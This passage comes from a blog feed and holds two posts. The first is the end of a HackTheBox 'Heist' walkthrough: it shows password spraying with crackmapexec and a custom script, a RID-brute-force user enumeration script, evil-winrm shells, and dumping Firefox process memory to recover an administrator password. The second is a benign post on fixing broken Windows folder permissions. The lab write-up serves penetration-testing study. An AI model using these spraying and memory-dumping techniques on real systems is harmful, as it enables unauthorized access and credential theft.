</span></span><span class="line"><span class="cl">SMB         10.10.10.149    <span class="m">445</span>    SUPPORTDESK      <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         10.10.10.149    <span class="m">445</span>    SUPPORTDESK      <span class="o">[</span>+<span class="o">]</span> SupportDesk<span class="se">\h</span>azard:stealth1agent 
</span></span></code></pre></div><p>Another spray shows that user <code>hazard</code> can login into RPC servic as well.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ ./exploits/rpcspray.sh usernames.list passwords.list 10.10.10.149
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@stealth1agent 
</span></span><span class="line"><span class="cl">Account Name: Hazard, Authority Name: SUPPORTDESK
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@<span class="nv">$uperP</span>@ssword 
</span></span><span class="line"><span class="cl">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d 
</span></span><span class="line"><span class="cl">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@stealth1agent 
</span></span><span class="line"><span class="cl">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@<span class="nv">$uperP</span>@ssword 
</span></span><span class="line"><span class="cl">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d 
</span></span><span class="line"><span class="cl">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</span></span></code></pre></div><h4 id="user-enumeration-via-rpc">User Enumeration via RPC</h4>
<p>Since the share doesn&rsquo;t contain anything juicy, the other thing I can do with user hazard is enumeration on RPC.</p>
<p>Within <code>rpcclient</code> shell, <code>enumdomusers</code> is typically used to enumerate domain users, but it doesn&rsquo;t work here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ rpcclient -U <span class="s1">&#39;hazard%stealth1agent&#39;</span> 10.10.10.149                   
</span></span><span class="line"><span class="cl">rpcclient $&gt; srvinfo
</span></span><span class="line"><span class="cl">        10.10.10.149   Wk Sv NT SNT         
</span></span><span class="line"><span class="cl">        platform_id     :       <span class="m">500</span>
</span></span><span class="line"><span class="cl">        os version      :       10.0
</span></span><span class="line"><span class="cl">        server <span class="nb">type</span>     :       0x9003
</span></span><span class="line"><span class="cl">rpcclient $&gt; enumdomusers
</span></span><span class="line"><span class="cl">result was NT_STATUS_CONNECTION_DISCONNECTED
</span></span></code></pre></div><p>Based on the result, the problem here was not the user&rsquo;s permissions. But, fortunately, the  <code>lookupnames</code>  command can be used to retrieve user&rsquo;s <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows">SID</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rpcclient $&gt; lookupnames hazard
</span></span><span class="line"><span class="cl">hazard S-1-5-21-4254423774-1266059056-3197185112-1008 <span class="o">(</span>User: 1<span class="o">)</span>
</span></span></code></pre></div><p>Reverse lookups (SID to username) also works here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rpcclient $&gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008
</span></span><span class="line"><span class="cl">S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK<span class="se">\H</span>azard <span class="o">(</span>1<span class="o">)</span>
</span></span></code></pre></div><p>In Windows system, excluding the RID section, this value <code>S-1-5-21-4254423774-1266059056-3197185112-[RID]</code>  is likely to be unique and is fixed for each computer domain. A normal user RID usually starts from 1000, and with this, I can enumerate the available users by incrementing the number.</p>
<p>The enumeration can be scripted using bash, and I&rsquo;ve created one to enumerate the first 20 users.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="nv">sid</span><span class="o">=</span><span class="s2">&#34;S-1-5-21-4254423774-1266059056-3197185112&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1000</span> 1020<span class="sb">`</span><span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl"> rpcclient -U <span class="s2">&#34;hazard%stealth1agent&#34;</span> -c <span class="s2">&#34;lookupsids </span><span class="nv">$sid</span><span class="s2">-</span><span class="nv">$i</span><span class="s2">;quit&#34;</span> 10.10.10.149 <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f2
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span></code></pre></div><blockquote>
<p>Note: <code>enumdomusers</code> RID returns in hexadecimal, for example a builtin administrator account has a default RID of 500 in decimal, so in hex it&rsquo;s 0x1F4.</p>
</blockquote>
<p>I saved the script as <code>rpc-userenum.sh</code> and ran it, and it returned with three valid usernames. I will add these usernames to my username wordlist.</p>
<p><div class="img-container"><img src="imgs/image-20210712105959998-1627299069625.png" alt="image-20210712105959998"  /></div>
</p>
<h3 id="shell-as-chase">Shell as Chase</h3>
<h4 id="password-spray-1">Password Spray</h4>
<p>With updated username wordlist, I could do another password spray attack on WinRM. The results shows a &ldquo;Pwn3d!&rdquo; message for user <code>chase</code> with a password of <code>Q4)sJu\Y8qz*A3?d </code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ crackmapexec winrm 10.10.10.149 -u usernames.list -p passwords.list 
</span></span><span class="line"><span class="cl">WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:10.10.10.149<span class="o">)</span> <span class="o">(</span>domain:None<span class="o">)</span>
</span></span><span class="line"><span class="cl">WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>*<span class="o">]</span> http://10.10.10.149:5985/wsman
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>+<span class="o">]</span> None<span class="se">\c</span>hase:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d <span class="o">(</span>Pwn3d!<span class="o">)</span>
</span></span></code></pre></div><h4 id="winrm---chase">WinRM - Chase</h4>
<p>I can login into the system with <code>chase</code>&rsquo;s credentials using <code>evil-winrm</code>. The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.149 -u <span class="s1">&#39;chase&#39;</span> -p <span class="s1">&#39;Q4)sJu\Y8qz*A3?d&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; whoami<span class="p">;</span> hostname<span class="p">;</span> ipconfig<span class="p">;</span> <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
</span></span><span class="line"><span class="cl">supportdesk<span class="se">\c</span>hase
</span></span><span class="line"><span class="cl">SupportDesk
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::5d4b:5294:9dc3:565c
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::5d4b:5294:9dc3:565c%15
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.149
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
</span></span><span class="line"><span class="cl">                                       10.10.10.2
</span></span><span class="line"><span class="cl">a127d...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h4 id="tools-share">Tools Share</h4>
<p>Before going further, I would like to host my essential tools using <code>impacket-smbserver</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ impacket-smbserver ef ~/tools -smb2support -username ef -password ef
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.149,49708<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\e</span>f,SUPPORTDESK<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> User SUPPORTDESK<span class="se">\e</span>f authenticated successfully
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The share then used on Heist. With this, I could use any of my tools directly from the share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> net use <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f /user:ef ef
</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed successfully.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> <span class="nb">cd</span> <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::<span class="se">\\</span>10.10.14.83<span class="se">\e</span>f&gt; 
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In <code>chase</code>&rsquo;s Desktop there is another file called <code>todo.txt</code>. As the name implies, it contains to-do list.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; <span class="nb">type</span> todo.txt
</span></span><span class="line"><span class="cl">Stuff to-do:
</span></span><span class="line"><span class="cl">1. Keep checking the issues list.
</span></span><span class="line"><span class="cl">2. Fix the router config.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Done:
</span></span><span class="line"><span class="cl">1. Restricted access <span class="k">for</span> guest user.
</span></span></code></pre></div><p>While looking at the WinPEAS output, I noticed multiple Firefox processes were running.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">  [+] Current TCP Listening Ports
</span></span><span class="line"><span class="cl">   [?] Check for services restricted from the outside 
</span></span><span class="line"><span class="cl">  Enumerating IPv4 connections
</span></span><span class="line"><span class="cl">         
</span></span><span class="line"><span class="cl">  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...[SNIP]...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49672         127.0.0.1             49673           Established       6868            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49673         127.0.0.1             49672           Established       6868            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49674         127.0.0.1             49675           Established       6016            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49675         127.0.0.1             49674           Established       6016            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49680         127.0.0.1             49681           Established       5496            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49681         127.0.0.1             49680           Established       5496            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49682         127.0.0.1             49683           Established       2068            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49683         127.0.0.1             49682           Established       2068            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span></code></pre></div><h4 id="dump-firefox-process">Dump Firefox Process</h4>
<p>I will employs <code>procdump64.exe</code> to dump the Firefox data from the memory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f<span class="se">\p</span>rocdump64.exe -accepteula -ma <span class="m">6868</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ProcDump v10.0 - Sysinternals process dump utility
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> 2009-2020 Mark Russinovich and Andrew Richards
</span></span><span class="line"><span class="cl">Sysinternals - www.sysinternals.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>23:07:07<span class="o">]</span> Dump <span class="m">1</span> initiated: C:<span class="se">\i</span>amf<span class="se">\f</span>irefox.exe_210712_230707.dmp
</span></span><span class="line"><span class="cl"><span class="o">[</span>23:07:07<span class="o">]</span> Dump <span class="m">1</span> writing: Estimated dump file size is <span class="m">535</span> MB.
</span></span><span class="line"><span class="cl"><span class="o">[</span>23:07:08<span class="o">]</span> Dump <span class="m">1</span> complete: <span class="m">536</span> MB written in 1.5 seconds
</span></span><span class="line"><span class="cl"><span class="o">[</span>23:07:09<span class="o">]</span> Dump count reached.
</span></span></code></pre></div><p>Because I don&rsquo;t want to grab that fatty <code>536 MB</code> file,  I will use  <code>strings64.exe</code> and redirect the output to a text file to get some readable part from the dump file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; cmd /c <span class="s2">&#34;\\10.10.14.83\ef\strings64.exe -accepteula firefox.exe_210712_230707.dmp &gt; foxdump.txt&#34;</span>
</span></span><span class="line"><span class="cl">cmd.exe : 
</span></span><span class="line"><span class="cl">    + CategoryInfo          : NotSpecified: <span class="o">(</span>:String<span class="o">)</span> <span class="o">[]</span>, RemoteException
</span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : NativeCommandError
</span></span><span class="line"><span class="cl">Strings v2.54 - Search <span class="k">for</span> ANSI and Unicode strings in binary images.
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> 1999-2021 Mark Russinovich
</span></span><span class="line"><span class="cl">Sysinternals - www.sysinternals.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; dir
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\i</span>amf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                -------------         ------ ----
</span></span><span class="line"><span class="cl">-a----        7/12/2021  11:07 PM      <span class="m">547841456</span> firefox.exe_210712_230707.dmp
</span></span><span class="line"><span class="cl">-a----        7/12/2021  11:18 PM      <span class="m">136871696</span> foxdump.txt
</span></span></code></pre></div><p>Searching for a string &ldquo;password&rdquo; in the converted dump file reveals the password used by admin (<code>4dD!5}x/re8]FBuZ</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; gc foxdump.txt <span class="p">|</span> <span class="k">select</span>-string <span class="s2">&#34;password&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s2">&#34;C:\Program Files\Mozilla Firefox\firefox.exe&#34;</span> localhost/login.php?login_username<span class="o">=</span>admin@support.htb<span class="p">&amp;</span><span class="nv">login_password</span><span class="o">=</span>4dD!5<span class="o">}</span>x/re8<span class="o">]</span>FBuZ<span class="p">&amp;</span><span class="nv">login</span><span class="o">=</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p><strong>[Side note]</strong></p>
<p>If this was done by automation script, maybe I could try to drop a packet sniffer before dumping the whole process.</p>
<p><div class="img-container"><img src="imgs/image-20210726192951302.png" alt="image-20210726192951302"  /></div>
</p>
<h4 id="winrm---administrator">WinRM - Administrator</h4>
<p>The password <code>4dD!5}x/re8]FBuZ</code> works for administrator account.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.149 -u <span class="s1">&#39;Administrator&#39;</span> -p <span class="s1">&#39;4dD!5}x/re8]FBuZ&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami<span class="p">;</span> hostname<span class="p">;</span> ipconfig<span class="p">;</span> <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
</span></span><span class="line"><span class="cl">supportdesk<span class="se">\a</span>dministrator
</span></span><span class="line"><span class="cl">SupportDesk
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::60f9:33ef:49c0:aa91
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::60f9:33ef:49c0:aa91%15
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.149
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
</span></span><span class="line"><span class="cl">                                       10.10.10.2
</span></span><span class="line"><span class="cl">50dfa...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Me vs Windows Permissions</title>
      <link>https://fahmifj.github.io/blog/me-vs-windows-permissions/</link>
      <pubDate>Wed, 21 Jul 2021 07:07:50 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/me-vs-windows-permissions/</guid>
      <description>Facing weird error on Windows 10? Then maybe this post could help you</description>
      <content:encoded><![CDATA[<p>Yesterday, I wanted to upgrade my Microsoft Office, and then planned to clean up my Windows laptop from unused programs, particularly the ones installed by chocolatey (Windows package manager). But, you guess it, things don&rsquo;t always go as planned.</p>
<p>The first problem I encounter was <code>Error Code: 30015-4 (5)</code> while trying to re-install my Microsoft Office, and then several  <code>C:\ProgramData\Microsoft\Windows GetLastError:5</code> error messages. These problems were related to Windows permissions, and I suspect that they were caused by a Microsoft troubleshooter tool called <a href="https://www.microsoft.com/en-us/download/100607">SaRA</a>. The tool might have accidentally messed up the Windows permissions during the process of cleaning up my previous Microsoft Office. As a result, my Windows no longer be able to install or remove some apps.</p>
<p>I was able to resolve these problems by manually resetting the permissions of the respective app folders back to their original state. So, I think it would be fun to post the walkthrough (it might be boring for you 😅).</p>
<h2 id="the-problems">The Problems</h2>
<p>The first problem I ran into was <code>Error Code: 30015-4(5)</code> during the installation of Microsoft Office.</p>
<p><div class="img-container"><img src="imgs/image-20210721040950497.png" alt="image-20210721040950497"  title="Error Code: 30015-4 (5)"  /></div>
</p>
<p>I clicked on the online help, and it was pointing out to <a href="https://support.microsoft.com/en-us/office/fix-office-installation-errors-d5df89a9-0507-4b4c-92f9-22f457e630aa?ns=ocsac2rinstall&amp;version=16&amp;syslcid=1033&amp;uilcid=1033&amp;appver=cin160&amp;helpid=%225-4-30015%22&amp;ui=en-us&amp;rs=en-us&amp;ad=us">this page</a>. At the bottom of the page, it offers an &ldquo;easy fix&rdquo; tool to resolve the problem above. I downloaded and ran that tool, but the error remains 🙃.</p>
<p><div class="img-container"><img src="imgs/image-20210721041358098.png" alt="image-20210721041358098"  title="An easy fix tool that resulted in another chaos"  /></div>
</p>
<p>At this point, I couldn&rsquo;t install or uninstall any applications wrapped with Windows Installer (<code>.msi</code>) anymore, including NodeJS. It&rsquo;s the same problem as the one in my <a href="https://fahmifj.github.io/blog/play-with-printnightmare/">PrintNightmare</a> post, in which my Visual Studio refuses to install the Windows SDK.</p>
<p><div class="img-container"><img src="./imgs/image-20210718024015408.png" alt="image-20210718024015408"  /></div>
</p>
<p>And somehow, this also affects my laptop&rsquo;s WiFi functionality/features, such as:</p>
<ul>
<li>Unable to save WiFi profiles, auto-connect no longer works.</li>
<li>Unable to turn on the mobile hotspot feature</li>
<li>The &ldquo;Forget&rdquo; and &ldquo;Properties&rdquo; options are missing when a right-click is performed on a WiFi connection.</li>
</ul>
<p>The most weird one is a stack-based buffer error came from my WiFi settings.</p>
<p><div class="img-container"><img src="imgs/image-20210721050915867.png" alt="image-20210721050915867"  title="Stack-based buffer error"  /></div>
</p>
<p>The stack-based buffer error raises when I clicked any currently in use Wi-Fi connection from the Wi-Fi settings.</p>
<p><div class="img-container"><img src="imgs/image-20210721053820002.png" alt="image-20210721053820002"  title="WiFi Settings"  /></div>
</p>
<p>Also, the &ldquo;Forget&rdquo; and &ldquo;Properties&rdquo; options were missing. I found a similar issue <a href="https://answers.microsoft.com/en-us/windows/forum/all/windows-10-doesnt-save-wifi-network-resolved/16ae1129-e24b-4268-91c4-acc4446966fa">here</a> but the solution doesn&rsquo;t suite my environment.</p>
<p><div class="img-container"><img src="imgs/image-20210721054401662.png" alt="image-20210721054401662"  title="Missing the Forget and the Properties options"  /></div>
</p>
<h2 id="finding-the-root-cause">Finding The Root Cause</h2>
<p>Searching for <code>Error Code: 30015-4  (5)</code> on the Microsoft Support site didn&rsquo;t really help, so I started to search for the official documentation about error code, and I found <a href="https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-">this page</a>. I couldn&rsquo;t find anything about &ldquo;30015-4&rdquo; in that page, but I think I did know what &ldquo;(5)&rdquo; meant.</p>
<p><div class="img-container"><img src="imgs/image-20210721043547662.png" alt="image-20210721043547662"  /></div>
</p>
<p>At this point, it was clear that these problems were related to the system permissions (even my Wi-Fi problem).</p>
<p>I started to investigate <code>C:\Program Files\</code> and <code>C:\Program Files (x86)\</code> (the default folder for installed apps), but no problems were found there.  So the next one is <code>C:\ProgramData</code>, where all application data is stored/created.</p>
<p>While investigating all the folders under <code>C:\ProgramData\</code> and <code>C:\ProgramData\Microsoft</code>, I noticed that some of the folders only have my account listed in their security properties.</p>
<p><div class="img-container"><img src="imgs/image-20210721044802348.png" alt="image-20210721044802348"  title="Bad Permissions on Office folder"  /></div>
</p>
<p>Normally, the folder permissions under <code>C:\ProgramData</code> should be configured similar to the image below (taken from VirtualBox folder) .</p>
<p><div class="img-container"><img src="imgs/image-20210721045334784.png" alt="image-20210721045334784"  title="Good Permissions: Basic"  /></div>
</p>
<p>And here are the advanced permission settings.</p>
<p><div class="img-container"><img src="imgs/image-20210721045624596.png" alt="image-20210721045624596"  title="Good Permissions: Advanced Settings"  /></div>
</p>
<p>Now I know how the default permissions look like, and I can use this as a template to fix the other folders with bad permissions.</p>
<h2 id="fix-the-problems">Fix The Problems</h2>
<h3 id="office-error-code-30015-4-5">Office Error Code: 30015-4 (5)</h3>
<p>This error <code>Error Code: 30015-4 (5)</code> can be resolved by enabling the inheritance on the respective app folder, which is <code>C:\ProgramData\Microsoft\OFFICE</code>. So that the permissions of the  <code>Microsoft</code> folder will be inherited to the <code>OFFICE</code> folder. I will also remove my account, &ldquo;Fahmi FJ&rdquo;, from the permission entries.</p>
<p><div class="img-container"><img src="imgs/image-20210721051824838.png" alt="image-20210721051824838"  title="Fix Office Error Code: 30015-4(5)"  /></div>
</p>
<p>If you&rsquo;re not sure about this, do check the other folders&rsquo; permissions under the same parent folder. Using this case, then the parent folder is <code>C:\ProgramData\Microsoft\</code>,  and the child are any folders under <code>C:\ProgramData\Microsoft\[child]</code>.</p>
<p>I got my Ms Office back now.</p>
<p><div class="img-container"><img src="imgs/image-20210721053920106.png" alt="image-20210721053920106"  /></div>
</p>
<h3 id="getlasterror5">GetLastError:5</h3>
<p>Any <code>GetLastError:5</code>, can be resolved using the same method as above, by enabling the inheritance to the affected application folder.</p>
<p>In my case, I got the following error message from chocolatey and node.js:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms GetLastError: <span class="m">5</span>
</span></span></code></pre></div><p>Then, first, I should look into the permissions of <code>Microsoft</code> folder, then <code>Windows</code> folder, and then <code>Start Menu</code> folder, and it turned out the problem is in the <code>Windows</code> folder permissions. So, to resolve this problem, I have to inherit the <code>Microsoft</code> folder permissions to the <code>Windows</code> folder, see image below.</p>
<p><div class="img-container"><img src="imgs/image-20210721114505028.png" alt="image-20210721114505028"  /></div>
</p>
<p>And then, I will revert the <code>Start Menu</code> folder permissions to default, see image below.</p>
<p><div class="img-container"><img src="imgs/image-20210721114911619.png" alt="image-20210721114911619"  /></div>
</p>
<p>Finally inherit the <code>Start Menu</code> folder permissions to the <code>Programs</code> folder.</p>
<p><div class="img-container"><img src="imgs/image-20210721115022365.png" alt="image-20210721115022365"  /></div>
</p>
<p>Again, if you&rsquo;re not sure about this, and didn&rsquo;t want to reinstall your Windows, try install a fresh Windows on Virtual Machine / Cloud and inspect the default permission settings.</p>
<h3 id="stack-based-and-wifi-error">Stack-based and WiFi error</h3>
<p>This section may resolve the following problems.</p>
<ul>
<li>SystemSettings.exe - System Error: The system detected an overrun of a blabla..</li>
<li>Windows won&rsquo;t remember Wi-Fi password</li>
<li>The &ldquo;Forget&rdquo; and &ldquo;Properties&rdquo; options are missing from Wi-Fi connection.</li>
<li>Mobile Hotspot Wi-Fi</li>
</ul>
<p>In my case the root cause of these problems was also the folder permission.</p>
